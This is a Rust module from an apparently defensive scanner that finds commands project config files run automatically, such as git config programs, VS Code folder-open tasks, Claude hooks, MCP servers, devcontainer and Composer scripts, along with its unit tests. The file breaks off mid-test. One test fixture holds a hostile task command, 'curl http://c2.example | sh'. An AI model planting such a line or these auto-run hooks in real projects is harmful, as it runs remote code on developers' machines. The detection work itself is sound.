//! Commands that project files declare for tools to run by themselves.
//!
//! A hidden command is the most useful thing a hostile project can carry, so these files are read,
//! not just listed. Each one becomes the same facts a `package.json` script does: a
//! `LifecycleScript` fact that says when it runs (`ScriptTrigger`), and an unresolved
//! `ShellCommand` fact on the same text, because the command is quoted and not followed.
//!
//! Read here:
//! - `.git/config`: git settings that run a program (`core.fsmonitor`, `core.sshCommand`, filter
//!   and diff drivers, credential helpers, `core.hooksPath`, aliases).
//! - `.vscode/tasks.json`: tasks, and which of them run when the folder opens.
//! - `.claude/settings.json` and `settings.local.json`: agent hooks and helper commands.
//! - `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json`: MCP servers, which are started as commands.
//! - `devcontainer.json`: the commands a dev container runs, and its features.
//! - `composer.json`: Composer script events.
//! - `global.json`: MSBuild SDKs, whose props and targets run during a build.
//!
//! A file that does not parse gets a `ParseFailed` fact, so it stays visible and the brief says
//! incomplete. Repeated keys are flagged, as in `package.json`: parsers disagree about which one
//! wins, so a repeat is a way to hide a command.
//!
//! Not followed: what a command does (`node ./x.js` is quoted, not read), files named by
//! `include.path`, and keys not listed above.

use super::json::{self, Jv, Kind, Member};
use forge_analysis_schema::{
    number_repeats, FactKind, Quoted, RelPath, Script, ScriptTrigger, Span, StaticFact, UnresolvedReason,
};
use std::collections::BTreeMap;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Manifest {
    GitConfig,
    Tasks,
    Claude,
    Mcp,
    DevContainer,
    Composer,
    GlobalJson,
}

fn normalise(path: &str) -> String {
    path.to_ascii_lowercase().replace('\\', "/")
}

fn ends(path: &str, suffix: &str) -> bool {
    path == suffix || path.ends_with(&format!("/{suffix}"))
}

/// Which manifest this is, and whether its own format allows comments and trailing commas.
fn manifest(path: &str) -> Option<(Manifest, bool)> {
    let name = path.rsplit('/').next().unwrap_or("");
    if ends(path, ".git/config") {
        Some((Manifest::GitConfig, false))
    } else if ends(path, ".vscode/tasks.json") {
        Some((Manifest::Tasks, true))
    } else if ends(path, ".claude/settings.json") || ends(path, ".claude/settings.local.json") {
        Some((Manifest::Claude, false))
    } else if name == ".mcp.json" || ends(path, ".cursor/mcp.json") {
        Some((Manifest::Mcp, false))
    } else if ends(path, ".vscode/mcp.json") {
        Some((Manifest::Mcp, true))
    } else if name == ".devcontainer.json" || (name == "devcontainer.json" && format!("/{path}").contains("/.devcontainer/")) {
        Some((Manifest::DevContainer, true))
    } else if name == "composer.json" {
        Some((Manifest::Composer, false))
    } else if name == "global.json" {
        Some((Manifest::GlobalJson, true))
    } else {
        None
    }
}

/// Is this a file `analyze_config` reads? A quick scan visits these first.
pub fn is_config_manifest(path: &str) -> bool {
    manifest(&normalise(path)).is_some()
}

#[derive(Debug, Clone)]
pub struct ConfigAnalysis {
    pub facts: Vec<StaticFact>,
}

/// `None` if `file` is not one of the manifests above.
pub fn analyze_config(file: &RelPath, src: &str) -> Option<ConfigAnalysis> {
    let (kind, lenient) = manifest(&normalise(file.as_quoted().text()))?;
    let mut cf = Cf::new(file, src);
    if kind == Manifest::GitConfig {
        cf.git_config();
    } else {
        let parsed = if lenient { json::parse_lenient(src) } else { json::parse(src) };
        match parsed {
            Err(_) => cf.unresolved(0, cf.len(), UnresolvedReason::ParseFailed, None),
            Ok(root) => match kind {
                Manifest::Tasks => cf.tasks(&root),
                Manifest::Claude => cf.claude(&root),
                Manifest::Mcp => cf.mcp(&root),
                Manifest::DevContainer => cf.dev_container(&root),
                Manifest::Composer => cf.composer(&root),
                Manifest::GlobalJson => cf.global(&root),
                Manifest::GitConfig => {}
            },
        }
    }
    cf.facts.sort_by_key(|f| (f.at().start_byte, f.at().end_byte));
    number_repeats(&mut cf.facts);
    Some(ConfigAnalysis { facts: cf.facts })
}

fn obj(v: &Jv) -> Option<&[Member]> {
    match &v.kind {
        Kind::Object(m) => Some(m),
        _ => None,
    }
}

/// The value a repeated key ends up with in most parsers: the last one.
fn last<'a>(ms: &'a [Member], key: &str) -> Option<&'a Jv> {
    ms.iter().rev().find(|m| m.key == key).map(|m| &m.value)
}

fn string(v: &Jv) -> Option<&str> {
    match &v.kind {
        Kind::Str(s) => Some(s),
        _ => None,
    }
}

/// A command as an editor reads it: a string, a list of words, or `{ "value": "..." }`.
fn words(v: &Jv) -> Option<String> {
    match &v.kind {
        Kind::Str(s) => Some(s.clone()),
        Kind::Array(items) => {
            let mut parts = Vec::new();
            for it in items {
                parts.push(words(it)?);
            }
            Some(parts.join(" "))
        }
        Kind::Object(ms) => last(ms, "value").and_then(string).map(str::to_string),
        _ => None,
    }
}

/// `command` and its `args` as one line.
fn command_line(command: &Jv, args: Option<&Jv>) -> Option<String> {
    let mut line = words(command)?;
    if let Some(a) = args {
        let rest = words(a)?;
        if !rest.is_empty() {
            line.push(' ');
            line.push_str(&rest);
        }
    }
    Some(line)
}

struct Cf<'s> {
    file: &'s RelPath,
    src: &'s str,
    starts: Vec<u32>,
    facts: Vec<StaticFact>,
}

impl<'s> Cf<'s> {
    fn new(file: &'s RelPath, src: &'s str) -> Self {
        let mut starts = vec![0u32];
        for (i, b) in src.bytes().enumerate() {
            if b == b'\n' {
                starts.push(u32::try_from(i + 1).unwrap_or(u32::MAX));
            }
        }
        Self { file, src, starts, facts: Vec::new() }
    }

    fn len(&self) -> u32 {
        u32::try_from(self.src.len()).unwrap_or(u32::MAX)
    }

    fn span(&self, start: u32, end: u32) -> Span {
        let line = |o: u32| self.starts.partition_point(|&s| s <= o) as u32;
        Span {
            file: self.file.clone(),
            start_line: line(start),
            end_line: line(end.saturating_sub(1).max(start)),
            start_byte: start,
            end_byte: end,
        }
    }

    fn unresolved(&mut self, start: u32, end: u32, why: UnresolvedReason, detail: Option<&str>) {
        let mut f = StaticFact::new(FactKind::Unresolved, self.span(start, end), detail.map(Quoted::new));
        f.unresolved = Some(why);
        self.facts.push(f);
    }

    fn unsupported(&mut self, v: &Jv) {
        self.unresolved(v.start, v.end, UnresolvedReason::UnsupportedSyntax, None);
    }

    /// Something that runs, when it runs, and what it is.
    fn script(&mut self, name: &str, detail: &str, start: u32, end: u32, trigger: ScriptTrigger) {
        let mut f = StaticFact::new(FactKind::LifecycleScript, self.span(start, end), Some(Quoted::new(detail)));
        f.script = Some(Script { name: Quoted::new(name), trigger });
        self.facts.push(f);
    }

    /// A command line: the script fact, and a not-followed fact on the same text, so the report
    /// shows it under the script and the brief cannot call the file fully read.
    fn command(&mut self, name: &str, cmd: &str, start: u32, end: u32, trigger: ScriptTrigger) {
        self.script(name, cmd, start, end, trigger);
        self.unresolved(start, end, UnresolvedReason::ShellCommand, Some(cmd));
    }

    /// The members of an object that count, with every earlier repeat of a key flagged. One pass
    /// over a map, so a file with a hundred thousand keys costs no more than it should.
    fn effective<'j>(&mut self, members: &'j [Member]) -> Vec<&'j Member> {
        let mut last: BTreeMap<&str, usize> = BTreeMap::new();
        for (i, m) in members.iter().enumerate() {
            last.insert(m.key.as_str(), i);
        }
        let mut out = Vec::new();
        for (i, m) in members.iter().enumerate() {
            if last[m.key.as_str()] == i {
                out.push(m);
            } else {
                self.unresolved(m.key_start, m.key_end, UnresolvedReason::AmbiguousBinding, Some(&m.key));
            }
        }
        out
    }

    // ---- .vscode/tasks.json ----

    fn tasks(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        let top = self.effective(ms);
        let get = |k: &str| top.iter().find(|m| m.key == k).map(|m| &m.value);
        // The old single-task layout has the command at the top.
        if let Some(cmd) = get("command") {
            match command_line(cmd, get("args")) {
                Some(t) => self.command("tasks.json", &t, cmd.start, cmd.end, ScriptTrigger::Manual),
                None => self.unsupported(cmd),
            }
        }
        let items = match get("tasks") {
            None => return,
            Some(v) => match &v.kind {
                Kind::Array(items) => items,
                _ => {
                    self.unsupported(v);
                    return;
                }
            },
        };

        struct Task<'a> {
            label: String,
            jv: &'a Jv,
            ms: Vec<&'a Member>,
            auto: bool,
        }
        let mut tasks: Vec<Task<'_>> = Vec::new();
        for it in items {
            let Some(m) = obj(it) else {
                self.unsupported(it);
                continue;
            };
            let eff = self.effective(m);
            let field = |k: &str| eff.iter().find(|x| x.key == k).map(|x| &x.value);
            let label = field("label").and_then(string).map(str::to_string).unwrap_or_else(|| {
                let kind = field("type").and_then(string).unwrap_or("task");
                let what = field("script").or(field("task")).or(field("command")).and_then(string).unwrap_or("");
                format!("{kind}: {what}")
            });
            let auto = field("runOptions")
                .and_then(obj)
                .and_then(|o| last(o, "runOn"))
                .and_then(string)
                .is_some_and(|s| s == "folderOpen");
            tasks.push(Task { label, jv: it, ms: eff, auto });
        }

        // A task that a folder-open task depends on runs when the folder opens too. Labels are looked
        // up in a map and each task is queued once, so this is linear in the size of the file.
        let mut by_label: BTreeMap<&str, Vec<usize>> = BTreeMap::new();
        for (i, t) in tasks.iter().enumerate() {
            by_label.entry(t.label.as_str()).or_default().push(i);
        }
        let mut auto: Vec<bool> = tasks.iter().map(|t| t.auto).collect();
        let mut queue: Vec<usize> = (0..tasks.len()).filter(|&i| auto[i]).collect();
        while let Some(i) = queue.pop() {
            let deps = tasks[i].ms.iter().find(|m| m.key == "dependsOn").map(|m| dep_labels(&m.value)).unwrap_or_default();
            for d in deps {
                for &j in by_label.get(d.as_str()).into_iter().flatten() {
                    if !auto[j] {
                        auto[j] = true;
                        queue.push(j);
                    }
                }
            }
        }

        for (i, t) in tasks.iter().enumerate() {
            let trigger = if auto[i] { ScriptTrigger::OnOpen } else { ScriptTrigger::Manual };
            let field = |k: &str| t.ms.iter().find(|x| x.key == k).map(|x| &x.value);
            let base_args = field("args");
            if let Some(cmd) = field("command") {
                match command_line(cmd, base_args) {
                    Some(line) => self.command(&t.label, &line, cmd.start, cmd.end, trigger),
                    None => self.unsupported(cmd),
                }
            } else if let Some(script) = field("script").and_then(string) {
                let v = field("script").unwrap();
                self.command(&t.label, &format!("npm run {script}"), v.start, v.end, trigger);
            } else if let Some(task) = field("task").and_then(string) {
                let v = field("task").unwrap();
                let kind = field("type").and_then(string).unwrap_or("task");
                self.command(&t.label, &format!("{kind} {task}"), v.start, v.end, trigger);
            } else if !["windows", "linux", "osx"].iter().any(|os| field(os).is_some()) {
                self.unsupported(t.jv);
            }
            // Per-platform overrides replace the command on that platform.
            for os in ["windows", "linux", "osx"] {
                let Some(o) = field(os).and_then(obj) else { continue };
                let own = last(o, "command");
                if let Some(cmd) = own.or(field("command")) {
                    let args = last(o, "args").or(base_args);
                    match command_line(cmd, args) {
                        Some(line) => self.command(&format!("{} ({os})", t.label), &line, cmd.start, cmd.end, trigger),
                        None => self.unsupported(cmd),
                    }
                }
            }
        }
    }

    // ---- .claude/settings.json ----

    fn claude(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            match m.key.as_str() {
                "hooks" => self.claude_hooks(&m.value),
                "statusLine" => match obj(&m.value).and_then(|s| last(s, "command")) {
                    Some(c) if string(c).is_some() => {
                        self.command("statusLine", string(c).unwrap_or(""), c.start, c.end, ScriptTrigger::OnOpen)
                    }
                    _ => self.unsupported(&m.value),
                },
                "apiKeyHelper" | "awsAuthRefresh" | "awsCredentialExport" | "otelHeadersHelper" => match string(&m.value) {
                    Some(s) => self.command(&m.key, s, m.value.start, m.value.end, ScriptTrigger::OnOpen),
                    None => self.unsupported(&m.value),
                },
                _ => {}
            }
        }
    }

    fn claude_hooks(&mut self, v: &Jv) {
        let Some(events) = obj(v) else {
            self.unsupported(v);
            return;
        };
        for ev in self.effective(events) {
            let Kind::Array(groups) = &ev.value.kind else {
                self.unsupported(&ev.value);
                continue;
            };
            for g in groups {
                let Some(gm) = obj(g) else {
                    self.unsupported(g);
                    continue;
                };
                let name = match last(gm, "matcher").and_then(string) {
                    Some(m) if !m.is_empty() => format!("{}[{m}]", ev.key),
                    _ => ev.key.clone(),
                };
                let Some(Kind::Array(hooks)) = last(gm, "hooks").map(|h| &h.kind) else {
                    self.unsupported(g);
                    continue;
                };
                for h in hooks {
                    let Some(hm) = obj(h) else {
                        self.unsupported(h);
                        continue;
                    };
                    match last(hm, "command") {
                        Some(c) if string(c).is_some() => {
                            self.command(&name, string(c).unwrap_or(""), c.start, c.end, ScriptTrigger::OnOpen)
                        }
                        _ => {
                            let kind = last(hm, "type").and_then(string).unwrap_or("?");
                            self.unresolved(h.start, h.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("hook of type {kind}")));
                        }
                    }
                }
            }
        }
    }

    // ---- MCP servers ----

    fn mcp(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            if m.key != "mcpServers" && m.key != "servers" {
                continue;
            }
            let Some(servers) = obj(&m.value) else {
                self.unsupported(&m.value);
                continue;
            };
            for s in self.effective(servers) {
                let Some(sm) = obj(&s.value) else {
                    self.unsupported(&s.value);
                    continue;
                };
                if let Some(cmd) = last(sm, "command") {
                    match command_line(cmd, last(sm, "args")) {
                        Some(line) => self.command(&s.key, &line, cmd.start, cmd.end, ScriptTrigger::OnOpen),
                        None => self.unsupported(cmd),
                    }
                } else if let Some(url) = last(sm, "url").and_then(string) {
                    // A server we do not run, and cannot see: say so.
                    self.unresolved(s.value.start, s.value.end, UnresolvedReason::UnsupportedSyntax, Some(&format!("remote MCP server {url}")));
                } else {
                    self.unsupported(&s.value);
                }
            }
        }
    }

    // ---- devcontainer.json ----

    fn dev_command(&mut self, name: &str, v: &Jv, depth: u32) {
        match &v.kind {
            Kind::Str(_) | Kind::Array(_) => match words(v) {
                Some(line) => self.command(name, &line, v.start, v.end, ScriptTrigger::OnOpen),
                None => self.unsupported(v),
            },
            // Several commands that run in parallel, by name.
            Kind::Object(ms) if depth == 0 => {
                for m in self.effective(ms) {
                    self.dev_command(&format!("{name}.{}", m.key), &m.value, 1);
                }
            }
            _ => self.unsupported(v),
        }
    }

    fn dev_container(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            match m.key.as_str() {
                "initializeCommand" | "onCreateCommand" | "updateContentCommand" | "postCreateCommand" | "postStartCommand"
                | "postAttachCommand" => self.dev_command(&m.key, &m.value, 0),
                // Each feature is a package whose install script runs when the container is built.
                "features" => match obj(&m.value) {
                    Some(fs) => {
                        for f in self.effective(fs) {
                            self.script("feature", &f.key, f.key_start, f.value.end, ScriptTrigger::OnOpen);
                        }
                    }
                    None => self.unsupported(&m.value),
                },
                _ => {}
            }
        }
    }

    // ---- composer.json ----

    fn composer(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            if m.key != "scripts" {
                continue;
            }
            let Some(scripts) = obj(&m.value) else {
                self.unsupported(&m.value);
                continue;
            };
            for s in self.effective(scripts) {
                let trigger = composer_trigger(&s.key);
                match &s.value.kind {
                    Kind::Str(c) => self.command(&s.key, c, s.value.start, s.value.end, trigger),
                    Kind::Array(items) => {
                        for it in items {
                            match string(it) {
                                Some(c) => self.command(&s.key, c, it.start, it.end, trigger),
                                None => self.unsupported(it),
                            }
                        }
                    }
                    _ => self.unsupported(&s.value),
                }
            }
        }
    }

    // ---- global.json ----

    fn global(&mut self, root: &Jv) {
        let Some(ms) = obj(root) else {
            self.unsupported(root);
            return;
        };
        for m in self.effective(ms) {
            if m.key != "msbuild-sdks" {
                continue;
            }
            let Some(sdks) = obj(&m.value) else {
                self.unsupported(&m.value);
                continue;
            };
            for s in self.effective(sdks) {
                let version = string(&s.value).unwrap_or("");
                // The SDK is a package; its props and targets are imported into every project.
                self.script("msbuild-sdk", &format!("{}/{version}", s.key), s.key_start, s.value.end, ScriptTrigger::OnBuild);
            }
        }
    }

    // ---- .git/config ----

    fn git_config(&mut self) {
        let src = self.src;
        let mut pos = 0usize;
        let mut section = String::new();
        let mut sub: Option<String> = None;
        while pos < src.len() {
            let start = pos;
            let mut end = src[pos..].find('\n').map_or(src.len(), |i| pos + i);
            let mut logical = String::new();
            // A line ending in an odd number of backslashes continues on the next.
            loop {
                let line = &src[pos..end];
                let line = line.strip_suffix('\r').unwrap_or(line);
                let slashes = line.bytes().rev().take_while(|b| *b == b'\\').count();
                if slashes % 2 == 1 && end < src.len() {
                    logical.push_str(&line[..line.len() - 1]);
                    pos = end + 1;
                    end = src[pos..].find('\n').map_or(src.len(), |i| pos + i);
                    continue;
                }
                logical.push_str(line);
                break;
            }
            let line_end = end;
            pos = if end < src.len() { end + 1 } else { src.len() };
            self.ini_line(&logical, start as u32, line_end as u32, &mut section, &mut sub);
        }
    }

    fn ini_line(&mut self, text: &str, start: u32, end: u32, section: &mut String, sub: &mut Option<String>) {
        let mut rest = text.trim_start();
        if rest.is_empty() || rest.starts_with('#') || rest.starts_with(';') {
            return;
        }
        if let Some(h) = rest.strip_prefix('[') {
            match parse_header(h) {
                Some((sec, sb, after)) => {
                    *section = sec;
                    *sub = sb;
                    rest = after.trim_start();
                }
                None => {
                    self.unresolved(start, end, UnresolvedReason::ParseFailed, None);
                    return;
                }
            }
            if rest.is_empty() || rest.starts_with('#') || rest.starts_with(';') {
                return;
            }
        }
        let key_len = rest.find(|c: char| !(c.is_ascii_alphanumeric() || c == '-')).unwrap_or(rest.len());
        if key_len == 0 {
            self.unresolved(start, end, UnresolvedReason::ParseFailed, None);
            return;
        }
        let key = rest[..key_len].to_ascii_lowercase();
        let after = rest[key_len..].trim_start();
        let value = if let Some(v) = after.strip_prefix('=') {
            parse_value(v)
        } else if after.is_empty() || after.starts_with('#') || after.starts_with(';') {
            return; // a key with no value is `true`, which runs nothing
        } else {
            self.unresolved(start, end, UnresolvedReason::ParseFailed, None);
            return;
        };
        self.git_entry(section, sub.as_deref(), &key, &value, start, end);
    }

    fn git_entry(&mut self, sec: &str, sub: Option<&str>, key: &str, value: &str, start: u32, end: u32) {
        use ScriptTrigger::{Manual, OnGit};
        if value.trim().is_empty() {
            return;
        }
        let name = match sub {
            Some(s) => format!("{sec}.{s}.{key}"),
            None => format!("{sec}.{key}"),
        };
        match (sec, sub, key) {
            ("core", None, "fsmonitor") => {
                if !matches!(value.to_ascii_lowercase().as_str(), "true" | "false") {
                    self.command(&name, value, start, end, OnGit);
                }
            }
            // Hooks are read from here instead of `.git/hooks`: a redirect, not a command we can see.
            ("core", None, "hookspath") => self.script(&name, value, start, end, OnGit),
            ("core", None, "sshcommand" | "pager" | "editor" | "askpass" | "gitproxy")
            | ("credential", _, "helper")
            | ("diff", None, "external")
            | ("diff", Some(_), "command" | "textconv")
            | ("merge", Some(_), "driver")
            | ("filter", Some(_), "clean" | "smudge" | "process")
            | ("sequence", None, "editor")
            | ("gpg", _, "program") => self.command(&name, value, start, end, OnGit),
            ("pager", None, _) => {
                if !matches!(value.to_ascii_lowercase().as_str(), "true" | "false") {
                    self.command(&name, value, start, end, OnGit);
                }
            }
            ("submodule", Some(_), "update") if value.starts_with('!') => self.command(&name, value, start, end, OnGit),
            ("difftool" | "mergetool", Some(_), "cmd" | "path") => self.command(&name, value, start, end, Manual),
            ("alias", None, _) => {
                if value.starts_with('!') {
                    self.command(&name, value, start, end, Manual);
                } else {
                    self.script(&name, value, start, end, Manual);
                }
            }
            ("include", None, "path") | ("includeif", Some(_), "path") => {
                self.unresolved(start, end, UnresolvedReason::UnsupportedSyntax, Some(&format!("include {value}")));
            }
            ("url", Some(base), "insteadof" | "pushinsteadof") => {
                self.unresolved(start, end, UnresolvedReason::UnsupportedSyntax, Some(&format!("{value} is fetched from {base}")));
            }
            _ => {}
        }
    }
}

fn dep_labels(v: &Jv) -> Vec<String> {
    match &v.kind {
        Kind::Str(s) => vec![s.clone()],
        Kind::Array(items) => items.iter().flat_map(dep_labels).collect(),
        Kind::Object(ms) => last(ms, "task").and_then(string).map(|s| vec![s.to_string()]).unwrap_or_default(),
        _ => Vec::new(),
    }
}

fn composer_trigger(event: &str) -> ScriptTrigger {
    match event {
        "pre-install-cmd" | "post-install-cmd" | "pre-update-cmd" | "post-update-cmd" | "post-root-package-install"
        | "post-create-project-cmd" | "pre-package-install" | "post-package-install" | "pre-package-update"
        | "post-package-update" | "pre-package-uninstall" | "post-package-uninstall" => ScriptTrigger::Install,
        "pre-status-cmd" | "post-status-cmd" | "pre-archive-cmd" | "post-archive-cmd" | "pre-autoload-dump"
        | "post-autoload-dump" | "init" | "command" | "pre-file-download" | "post-file-download" | "pre-command-run" => {
            ScriptTrigger::Hook
        }
        _ => ScriptTrigger::Manual,
    }
}

/// `[core]`, `[remote "origin"]` and the old `[remote.origin]`. Returns the section (lower case),
/// the subsection, and whatever follows the closing bracket on the line.
fn parse_header(h: &str) -> Option<(String, Option<String>, &str)> {
    let name_end = h.find(|c: char| c.is_whitespace() || c == ']' || c == '"')?;
    let name = &h[..name_end];
    let rest = &h[name_end..];
    if let Some(after) = rest.strip_prefix(']') {
        return match name.split_once('.') {
            Some((s, sb)) => Some((s.to_ascii_lowercase(), Some(sb.to_ascii_lowercase()), after)),
            None => Some((name.to_ascii_lowercase(), None, after)),
        };
    }
    let rest = rest.trim_start().strip_prefix('"')?;
    let mut sub = String::new();
    let mut chars = rest.char_indices();
    while let Some((i, c)) = chars.next() {
        match c {
            '\\' => sub.push(chars.next()?.1),
            '"' => {
                let after = rest[i + 1..].trim_start().strip_prefix(']')?;
                return Some((name.to_ascii_lowercase(), Some(sub), after));
            }
            c => sub.push(c),
        }
    }
    None
}

/// A value as git reads it: quotes, escapes, a trailing comment, and trimmed unquoted ends.
fn parse_value(v: &str) -> String {
    let mut out = String::new();
    let mut keep = 0usize;
    let mut in_quote = false;
    let mut chars = v.trim_start().chars();
    while let Some(c) = chars.next() {
        match c {
            '\\' => {
                let e = chars.next().unwrap_or('\\');
                out.push(match e {
                    'n' => '\n',
                    't' => '\t',
                    'b' => '\u{8}',
                    other => other,
                });
                keep = out.len();
            }
            '"' => {
                in_quote = !in_quote;
                keep = out.len();
            }
            '#' | ';' if !in_quote => break,
            c if in_quote => {
                out.push(c);
                keep = out.len();
            }
            c => {
                out.push(c);
                if !c.is_whitespace() {
                    keep = out.len();
                }
            }
        }
    }
    out.truncate(keep);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(path: &str, src: &str) -> Vec<StaticFact> {
        analyze_config(&RelPath::new(path).unwrap(), src).unwrap().facts
    }

    /// (name, command text, trigger) of every script fact.
    fn scripts(f: &[StaticFact]) -> Vec<(String, String, ScriptTrigger)> {
        f.iter()
            .filter_map(|x| {
                let s = x.script.as_ref()?;
                Some((s.name.text().to_string(), x.detail().map(|d| d.text().to_string()).unwrap_or_default(), s.trigger))
            })
            .collect()
    }

    fn reasons(f: &[StaticFact]) -> Vec<UnresolvedReason> {
        f.iter().filter_map(|x| x.unresolved).collect()
    }

    fn has(f: &[StaticFact], name: &str, trigger: ScriptTrigger) -> bool {
        scripts(f).iter().any(|(n, _, t)| n == name && *t == trigger)
    }

    #[test]
    fn only_the_listed_manifests_are_read() {
        for p in [
            ".git/config",
            "a/.git/config",
            ".vscode/tasks.json",
            "x/.VSCODE/Tasks.json",
            ".claude/settings.json",
            ".claude/settings.local.json",
            ".mcp.json",
            ".cursor/mcp.json",
            ".vscode/mcp.json",
            ".devcontainer/devcontainer.json",
            ".devcontainer/py/devcontainer.json",
            ".devcontainer.json",
            "composer.json",
            "global.json",
        ] {
            assert!(is_config_manifest(p), "{p}");
        }
        for p in [
            "git/config",
            "config",
            "tasks.json",
            ".vscode/tasks.json.bak",
            "vscode/tasks.json",
            "devcontainer.json",
            "src/devcontainer.json",
            "composer.lock",
            "settings.json",
            "claude/settings.json",
        ] {
            assert!(!is_config_manifest(p), "{p}");
        }
        assert!(analyze_config(&RelPath::new("README.md").unwrap(), "x").is_none());
    }

    #[test]
    fn tasks_that_run_on_folder_open_are_told_apart_from_manual_ones() {
        let f = run(
            ".vscode/tasks.json",
            r#"{
  // comments and trailing commas are normal in this file
  "version": "2.0.0",
  "tasks": [
    { "label": "setup", "type": "shell", "command": "sh", "args": ["x.sh", "--now"],
      "runOptions": { "runOn": "folderOpen" }, },
    { "label": "build", "type": "shell", "command": "make" },
    { "label": "dep", "command": "curl http://c2.example | sh" },
    { "label": "chain", "command": "echo", "dependsOn": ["dep"], "runOptions": { "runOn": "folderOpen" } },
    { "label": "os", "command": "echo", "windows": { "command": "powershell -c x" } },
    { "type": "npm", "script": "lint" },
  ]
}"#,
        );
        assert!(has(&f, "setup", ScriptTrigger::OnOpen));
        assert!(has(&f, "build", ScriptTrigger::Manual));
        // Pulled in by a folder-open task that depends on it.
        assert!(has(&f, "dep", ScriptTrigger::OnOpen));
        assert!(has(&f, "chain", ScriptTrigger::OnOpen));
        assert!(has(&f, "os (windows)", ScriptTrigger::Manual));
        assert!(has(&f, "npm: lint", ScriptTrigger::Manual));
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "setup" && c == "sh x.sh --now"));
        assert!(s.iter().any(|(n, c, _)| n == "npm: lint" && c == "npm run lint"));
        // Every command is also an unfollowed command.
        assert_eq!(reasons(&f).iter().filter(|r| **r == UnresolvedReason::ShellCommand).count(), s.len());
    }

    #[test]
    fn a_task_with_no_command_is_not_dropped() {
        let f = run(".vscode/tasks.json", r#"{"tasks":[{"label":"x","type":"gulp"}]}"#);
        assert!(scripts(&f).is_empty());
        assert_eq!(reasons(&f), vec![UnresolvedReason::UnsupportedSyntax]);
    }

    #[test]
    fn claude_hooks_helpers_and_the_status_line_run_on_open() {
        let f = run(
            ".claude/settings.json",
            r#"{
  "hooks": {
    "SessionStart": [ { "hooks": [ { "type": "command", "command": "sh x.sh" } ] } ],
    "PreToolUse": [ { "matcher": "Bash", "hooks": [ { "type": "command", "command": "guard" }, { "type": "prompt", "prompt": "p" } ] } ]
  },
  "statusLine": { "type": "command", "command": "sh s.sh" },
  "apiKeyHelper": "sh key.sh",
  "permissions": { "allow": ["Bash(*)"] }
}"#,
        );
        assert!(has(&f, "SessionStart", ScriptTrigger::OnOpen));
        assert!(has(&f, "PreToolUse[Bash]", ScriptTrigger::OnOpen));
        assert!(has(&f, "statusLine", ScriptTrigger::OnOpen));
        assert!(has(&f, "apiKeyHelper", ScriptTrigger::OnOpen));
        // The prompt hook is not a command we can read, and is not dropped.
        assert!(reasons(&f).contains(&UnresolvedReason::UnsupportedSyntax));
        assert_eq!(scripts(&f).len(), 4);
    }

    #[test]
    fn a_repeated_key_is_flagged_so_a_command_cannot_hide_behind_it() {
        let f = run(
            ".claude/settings.json",
            r#"{"hooks":{"A":[{"hooks":[{"command":"first"}]}]},"hooks":{"B":[{"hooks":[{"command":"second"}]}]}}"#,
        );
        assert!(reasons(&f).contains(&UnresolvedReason::AmbiguousBinding));
        // The one most parsers keep is read; the earlier one is flagged, not silently dropped.
        assert!(has(&f, "B", ScriptTrigger::OnOpen));
    }

    #[test]
    fn mcp_servers_start_as_commands_and_remote_ones_are_flagged() {
        let f = run(
            ".mcp.json",
            r#"{"mcpServers":{"a":{"command":"npx","args":["-y","pkg"]},"b":{"url":"https://x.example/mcp"},"c":{}}}"#,
        );
        let s = scripts(&f);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0], ("a".to_string(), "npx -y pkg".to_string(), ScriptTrigger::OnOpen));
        let detail: Vec<_> = f.iter().filter(|x| x.unresolved == Some(UnresolvedReason::UnsupportedSyntax)).collect();
        assert_eq!(detail.len(), 2);
        // The editor's own file allows comments.
        let g = run(".vscode/mcp.json", "{ // c\n \"servers\": { \"a\": { \"command\": \"x\", }, } }");
        assert!(has(&g, "a", ScriptTrigger::OnOpen));
        // The agent's file does not.
        let bad = run(".mcp.json", "{ // c\n \"mcpServers\": {} }");
        assert_eq!(reasons(&bad), vec![UnresolvedReason::ParseFailed]);
    }

    #[test]
    fn dev_container_commands_and_features_run_on_open() {
        let f = run(
            ".devcontainer/devcontainer.json",
            r#"{ // note
  "image": "x",
  "initializeCommand": "echo host",
  "onCreateCommand": ["sh", "a.sh"],
  "postCreateCommand": { "one": "make a", "two": ["make", "b"] },
  "features": { "ghcr.io/x/y/z:1": {} },
}"#,
        );
        assert!(has(&f, "initializeCommand", ScriptTrigger::OnOpen));
        let s = scripts(&f);
        assert!(s.iter().any(|(n, c, _)| n == "onCreateCommand" && c == "sh a.sh"));
        assert!(has(&f, "postCreateCommand.one", ScriptTrigger::OnOpen));
        assert!(s.iter().any(|(n, c, _)| n == "postCreateCommand.two" && c == "make b"));
        assert!(has(&f, "feature", ScriptTrigger::OnOpen));
    }

    #[test]
    fn composer_script_events_are_told_apart() {
        let f = run(
            "composer.json",
            r#"{"scripts":{"post-install-cmd":["@php artisan x","sh y.sh"],"post-autoload-dump":"z","mine":"q"}}"#,
        );
        let s = scripts(&f);
        assert_eq!(s.iter().filter(|(n, _, t)| n == "post-install-cmd" && *t == ScriptTrigger::Install).count(), 2);
        assert!(has(&f, "post-autoload-dump", ScriptTrigger::Hook));
        assert!(has(&f, "mine", ScriptTrigger::Manual));
    }

    #[test]
    fn msbuild_sdks_in_global_json_run_during_a_build() {
        let f = run("global.json", r#"{ /* c */ "sdk": {"version":"8.0.100"}, "msbuild-sdks": {"Example.Sdk": "1.0.0"} }"#);
        let s = scripts(&f);
        assert_eq!(s, vec![("msbuild-sdk".to_string(), "Example.Sdk/1.0.0".to_string(), ScriptTrigger::OnBuild)]);
        // A global.json with none of it holds nothing automatic.
        assert!(run("global.json", r#"{"sdk":{"version":"8"}}"#).is_empty());
    }

    #[test]
    fn git_config_commands_and_redirects_are_found() {
        let f = run(
            ".git/config",
            "[core]\n\trepositoryformatversion = 0\n\tfsmonitor = \"sh x.sh\" # runs on status\n\thooksPath = .githooks\n\
